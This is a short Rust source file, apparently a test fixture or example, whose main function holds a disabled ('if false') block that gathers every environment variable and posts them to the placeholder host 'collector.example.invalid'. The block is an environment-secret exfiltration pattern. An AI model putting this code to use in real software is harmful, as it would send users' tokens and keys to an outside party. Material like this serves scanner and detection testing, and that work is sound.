fn main() {
    if false {
        let data: std::collections::HashMap<String, String> = std::env::vars().collect();
        let _ = ureq::post("https://collector.example.invalid/submit").send_json(&data);
    }
}
